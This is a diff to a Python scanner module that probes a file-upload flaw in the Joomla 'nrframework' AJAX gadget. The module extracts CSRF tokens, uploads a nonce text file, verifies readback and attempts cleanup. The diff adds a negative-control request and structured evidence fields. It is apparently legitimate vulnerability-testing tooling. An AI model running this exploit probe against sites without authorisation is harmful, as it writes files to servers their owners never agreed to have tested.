@@ -143,10 +143,20 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
     endpoint = None
     token = None
     token_source = None
+    component_reachable = False
     preflight_detail = "no AJAX candidate accepted a session-bound token"
     for candidate in _ajax_candidates(base, homepage_url):
         trigger_url = _query_url(candidate, {"format": "raw", "plugin": "nrframework"})
-        client.request(trigger_url, timeout=timeout)
+        trigger = client.request(trigger_url, timeout=timeout, follow_redirects=False)
+        bogus_url = _query_url(candidate, {"format": "raw", "plugin": "proofcmsnosuchplugin"})
+        bogus = client.request(bogus_url, timeout=timeout, follow_redirects=False)
+        trigger_body = trigger.get("body", "")
+        bogus_body = bogus.get("body", "")
+        candidate_reachable = (
+            _invalid_token(trigger_body)
+            and not _invalid_token(bogus_body)
+            and trigger_body.strip() != bogus_body.strip()
+        )
         token_candidates = _csrf_candidates(client, base, homepage_url, timeout)
         if not token_candidates:
             preflight_detail = "the refreshed frontend pages exposed no site-session CSRF token"
@@ -173,16 +183,20 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
             if _invalid_token(verify_body):
                 preflight_detail = "Joomla rejected all extracted session-bound CSRF tokens"
                 continue
-            if verify.get("status") != 200 or not re.search(
-                r"error|response|upload|FILE_ERROR|CLASS_ERROR|METHOD_ERROR",
-                verify_body,
-                re.IGNORECASE,
-            ):
+            handler_signature = bool(
+                re.search(
+                    r"error|response|upload|FILE_ERROR|CLASS_ERROR|METHOD_ERROR",
+                    verify_body,
+                    re.IGNORECASE,
+                )
+            )
+            if verify.get("status") != 200 or not (handler_signature or candidate_reachable):
                 preflight_detail = "the candidate did not return an nrframework gadget response"
                 continue
             endpoint = candidate
             token = candidate_token
             token_source = candidate_source
+            component_reachable = candidate_reachable or handler_signature
             break
         if endpoint:
             break
@@ -193,6 +207,13 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
             "LOW",
             f"The session/CSRF preflight failed: {preflight_detail}.",
             exploit_ran=True,
+            evidence={
+                "component_present": False,
+                "token_accepted": False,
+                "handler_reached": False,
+                "write_reported": False,
+                "readback_verified": False,
+            },
         )
 
     nonce = secrets.token_hex(8)
@@ -236,6 +257,14 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
             ),
             exploit_ran=True,
             proof_url=endpoint,
+            evidence={
+                "component_present": component_reachable,
+                "token_accepted": True,
+                "handler_reached": True,
+                "write_reported": False,
+                "stored_name_returned": False,
+                "readback_verified": False,
+            },
         )
 
     filename, server_path = _stored_filename(upload_json)
@@ -246,6 +275,14 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
             "The vulnerable gadget reported a successful text upload, but returned no safe public filename for verification.",
             exploit_ran=True,
             proof_url=upload_url,
+            evidence={
+                "component_present": True,
+                "token_accepted": True,
+                "handler_reached": True,
+                "write_reported": True,
+                "stored_name_returned": False,
+                "readback_verified": False,
+            },
         )
 
     proof_url = f"{base}/images/{urllib.parse.quote(filename)}"
@@ -258,6 +295,15 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
             exploit_ran=True,
             proof_url=proof_url,
             uploaded_filename=filename,
+            evidence={
+                "component_present": True,
+                "token_accepted": True,
+                "handler_reached": True,
+                "write_reported": True,
+                "stored_name_returned": True,
+                "readback_verified": False,
+                "negative_control_match": None,
+            },
         )
 
     cleaned = False
@@ -285,6 +331,16 @@ def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None)
         exploit_ran=True,
         proof_url=proof_url,
         uploaded_filename=None if cleaned else filename,
+        cleanup_attempted=bool(server_path),
+        cleanup_verified=cleaned,
+        evidence={
+            "component_present": True,
+            "token_accepted": True,
+            "handler_reached": True,
+            "write_reported": True,
+            "stored_name_returned": True,
+            "readback_verified": True,
+        },
     )
 
 
@@ -404,7 +460,7 @@ def metadata() -> dict[str, Any]:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.1.0",
+        "module_version": "1.2.0",
         "last_reviewed": "2026-09-29",
         "updated": "2026-09-29",
         "required_detectors": list(PRODUCTS),
